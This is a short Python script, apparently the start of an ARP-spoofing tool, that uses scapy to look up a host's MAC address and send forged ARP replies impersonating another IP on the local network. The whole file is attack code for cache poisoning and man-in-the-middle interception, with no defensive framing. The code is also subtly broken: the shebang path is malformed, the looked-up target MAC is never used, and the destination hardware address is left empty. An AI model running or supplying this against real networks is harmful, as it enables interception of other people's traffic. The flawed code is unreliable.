#!/usr/env/bin python3

import scapy.all as scapy

def getMAC(ip):
	arpRequest = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arpRequestBroadcast = broadcast/arpRequest
	answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

	return answeredList[0][1].hwsrc


def spoof(targetIP, spoofIP):
	targetMAC = getMAC(targetIP)
	packet = scapy.ARP(op = 2, pdst = targetIP, hwdst = "", psrc = spoofIP)
	scapy.send(packet)

